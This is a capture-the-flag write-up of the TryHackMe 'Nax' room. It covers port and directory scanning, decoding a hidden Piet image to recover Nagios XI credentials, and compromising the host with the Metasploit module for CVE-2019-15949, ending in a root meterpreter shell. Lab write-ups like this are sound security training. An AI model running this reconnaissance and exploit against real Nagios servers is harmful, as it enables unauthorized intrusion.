<h1 align="center"><a href="https://tryhackme.com/room/nax">TryHackMe Nax Room</a></h1>

<h2 align="center"><a href="https://twitter.com/0xTas">Writeup By: 0xTas</a></h2>

<p align="center">
    <a href="https://tryhackme.com/p/0xTas">
        <img alt="0xTas TryHackMe Profile" src="https://tryhackme-badges.s3.amazonaws.com/0xTas.png"></a>  
</p>


<h3 align="center">13 June 2022</h3>

---

## Description:

Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows a user authenticated remote code execution.


## Questions:


### What hidden file did you find?

Starting off with Nmap, I scanned the box: <br>

`tas@kali$ nmap -vv -sC -sV -p- -T4 nax.thm -oN nmap/full.log` <br>

> 22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) <br>
> 25/tcp   open  smtp       syn-ack Postfix smtpd <br>
> 80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu)) <br>
> 389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X <br>
> 443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.18 <br>
> 5667/tcp open  tcpwrapped syn-ack

There's quite a few ports open on this server. I decided to start off by further enumerating that Apache webserver. <br>

The first thing I did was visit the homepage of the http server at nax.thm, and it was a mostly blank page with what looked like ASCII art of a butterfly on it.
There was also a bit of text on the page that read "Welcome to elements", with a list of abbreviations from the periodic table of elements.

![Nagios Nax Webserver Homepage](https://i.imgur.com/j51wl19.png)

That list of elements immediately made me suspicious that something more was going on here. Especially considering how the elemental code for Mercury "Hg" shows up twice. <br>
To me, this screamed that it was probably some sort of code, so I went and referenced those elemental labels with their atmoic numbers and noted them down in order. <br>

It came out to: 47, 80, 73, 51, 84, 46, 80, 78, 103. <br>

Heading to [CyberChef](https://gchq.github.io/CyberChef/), I plugged these values in and converted them from decimal to ASCII. <br>
Sure enough, I was met with a decoded message which appeared to be a filename: <br>

<details>
<summary>Filename</summary>

> Answer: /PI3T.PNg
</details>

---

### Who is the creator of the file?

I navigated to that hidden file that I'd found and downloaded it. It appeard to be a PNG image, mostly white with some colored squares along the border. <br>

I know that images can hold a lot of useful metadata, so I used a command called `exiftool` to view that data in my terminal:

`tas@kali$ exiftool ****.PNg`

![Exiftool In Action](https://i.imgur.com/MylU91w.png)

<details>
<summary>Author Name</summary>

> Answer: Piet Mondrian
</details>

---

### What is the username you found?

Back to regular enumeration, I went to the homepage of the website again and checked the source code to see if I had missed anything. <br>
There was an HTML comment in the source that had the name of another endpoint: "/nagiosxi/". <br>

When I navigated there I was greeted with a login portal for Nagios XI, a popular network monitoring software.

I tried to login using a couple variations of the name I had discovered, along with some common default passwords. <br>
I was mostly just hoping to get a message that might tip me off to a potential username, but the error messages were of the typical, unhelpful: "username or password incorrect" variety. <br>

Next I checked the source for the login page to see if there would be any extra HTML comments or references to additional endpoints.
There weren't any other helpful comments, but I did find some other directories mentioned in the source. <br>

These were: <br>

1. /nagiosxi/images/ -- Indexing was disabled, so I can't direclty view the contents of this folder. <br>
2. /nagiosxi/includes/dashlets/ -- Indexing was also turned off for both folders in this path, so wasn't too helpful at the moment. <br>
3. /nagiosxi/about/ -- This endpoint was accessible, but it just had some basic and mostly useless info about the product and license. <br>


After that I decided to scan the webserver with Gobuster and Nikto: <br>

`tas@kali$ gobuster dir -u http://nax.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

`tas@kali$ nikto -h http://nax.thm` <br>


Gobuster found:

> /javascript -- But it was code 403 Forbidden <br>
> /nagios -- Which appeared to be a basic http auth login form.. <br>


Meanwhile, Nikto had an interesting piece of information to share with me.
Apparently the webserver had multiple index files in use, both index.html and index.php. <br>

Heading back to my browser, I checked nax.thm/index.html, and this was the simple page with ASCII art that I had seen earlier. <br>
nax.thm/index.php was more interesting, however. It was a simple page with a Nagios banner, but all it had was a link to the /nagiosxi/login.php panel that I had already found in the source. <br>


The basic Gobuster scan on the root of the webserver didn't find anything else interesting, so I decided to run another scan, this time on that "/nagiosxi/" endpoint: <br>

`tas@kali$ gobuster dir -u http://nax.thm/nagiosxi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

Right away, this scan found a lot of extra endpoints. While it kept running I decided to start checking them out. <br>

![Secondary Gobuster Scan Results (Partial)](https://i.imgur.com/cGkzKQX.png)


Unfortuantely, every single one of those endpoints either redirected me to /login.php or outright denied me access since I wasn't authenticated. <br>

At this point I got stuck for quite some time. I knew that I needed to somehow find a username and password, but there didn't seem to be any leads on the webserver. <br>

I also enumerated both smtp on port 25 and ldap on port 389, using [techniques](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp) I found on [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap),
but still could not find any useful information leading to the required Nagios credentials. <br>

Eventually I decided to consult another write-up to learn what I was missing. I found the [official video walkthrough](https://www.youtube.com/watch?v=pACKQsKZUBw) for the room by John Hammond, and began to watch it.
I did not want to spoil the entire challenge for myself, so I only watched up until the moment I had realized what I was missing. <br>

<details>
<summary>Spoilers</summary>

As it turns out, that png image file from earlier in the challenge had a lot more to it than I thought or expected. <br>
It is actually a program written in an esoteric programming language known as [Piet](https://www.dangermouse.net/esoteric/piet.html). <br>
The language uses image data to store and execute the code for each program. It was named after Piet Mondrian, the name that I had seen earlier in the challenge. <br>

Had I Googled that name, I certainly would have figured this out on my own a lot sooner, but I overlooked it because I seriously did not expect the name to be relevant beyond
maybe hinting at an account username for this specific challenge. <br>
Looking back, it definitely seems like the challenge questions were trying to nudge me in the right direction, but I sort of tunneled on trying more traditional pentesting/enumeration techniques instead. <br>
</details>

Anyways, back under my own power after this revelation I began to Google and read about Piet, which brought me to this [github page](https://github.com/gleitz/npiet) with a downloadable interpreter. <br>

Following the instructions on the page, I tried to `sudo apt install libgd`, but received a package not found error. <br>
The Github page did have a comment after that command stating "MacOS", so I figured it wasn't necessary on Linux, and proceeded with the following steps: <br>
```
tas@kali$ ./configure
tas@kali$ make
```
This failed with another error though, so I double-checked by Googling libgd and found out that the Linux version of the package is called `libgd-dev`. <br>

So running `sudo apt insall libgd-dev` was successful, and afterwards running `make` again succeeded and created an `npiet` binary for me to work with. <br>

Next I ran the `npiet` command on the png file that I had found at the beginning of the challenge, but it gave me another error.

![Npiet format error](https://i.imgur.com/LWOnV7s.png)

Luckily, I recognized this error from the THM challenge page: <br>

![Npiet format error remediation instructions](https://i.imgur.com/8Hp7M4S.png)

So I opened the file in Gimp and exported it as a .ppm file, and then ran `npiet` on it again. <br>
This time my terminal began endlessly spamming seemingly random characters, so I interrupted it with ctrl+c. <br>
On closer inspection of the now-still output, I noticed that it was actually endlessly printing the same loop of characters, which appeared to be potentially a username and password. <br>
This was confirmed once I tried inputting them as answers back on the challenge page. <br>

> Answer: nagios*****

---

### What is the password you found?

> Answer: n3p3UQ&9Bj**********

---

### What is the CVE number for this vulnerability?

Back to Google again, I searched for "nagios xi authenticated rce" and immediately found a page on exploit-db which disclosed the CVE number. <br>

<details>
<summary>CVE Number</summary>

> Answer: CVE-2019-15949
</details>

---

### What is the full path for the exploitation module?

> `tas@kali$ msfconsole` <br>
> `msf6> search nagios` <br>

To my surprise there were actually quite a lot of metasploit modules for Nagios RCE, but a certain one stood out to me because it sounded like what I had read about in the module's code on the Exploit-DB page. <br>

<details>
<summary>Metasploit Module Name</summary>

> Answer: exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
</details>

---

### Compromise the machine and locate user.txt

Using the Metasploit module that I identified above, I set the required options before running the exploit. <br>

> `msf6> set rhosts $IP` <br>
> `msf6> set lhost $MYIP` <br>
> `msf6> set password $PASS` <br>
> `msf6> exploit` <br>
> ... <br>
> `meterpreter >`

Success. <br>

After looking under the /home directory, I located user.txt in /home/galand/.

> Answer: THM{84b17add1d72a9f*****************}

---

### Locate root.txt

Running the `getuid` command from within meterpreter, I could see that I was actually already root. <br>
All I had left to do was check /root for the root.txt file, and sure enough it was there. <br>

> Answer: THM{c89b2e39c830675*****************}

---
